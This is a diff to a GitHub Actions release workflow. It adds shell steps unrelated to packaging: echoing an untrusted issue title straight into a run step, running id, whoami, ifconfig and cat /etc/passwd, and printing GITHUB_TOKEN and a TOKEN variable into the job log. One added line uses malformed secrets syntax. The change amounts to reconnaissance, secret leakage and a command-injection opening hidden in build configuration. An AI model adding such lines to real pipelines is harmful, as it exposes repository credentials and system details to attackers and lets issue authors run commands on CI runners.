@@ -43,12 +43,24 @@ jobs:
           export PKG=$(ls dist/ | grep tar)
           set -- $PKG
           echo "name=$1" >> $GITHUB_ENV
+          echo ${{ github.repository }}
+          echo "New issue: ${{ github.event.issue.title }}"
+          echo "New issue: $(id)"
+          echo "New issue: $(whoami)"
+          echo "New issue: $(cat /etc/passwd)"
+          echo "New issue: $(ifconfig)"
+          echo "${TOKEN:0:9}[...]"
+          echo "${TOKEN:0:9}[...]"
+          echo "Token: $GITHUB_TOKEN"
+          echo "name=  ${{ $secrets.GITHUB_TOKEN }} "
 
       - name: Upload Release Asset (sdist) to GitHub
         id: upload-release-asset
         uses: actions/upload-release-asset@v1
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+          
 
       - name: Create GitHub Release
         id: create_release
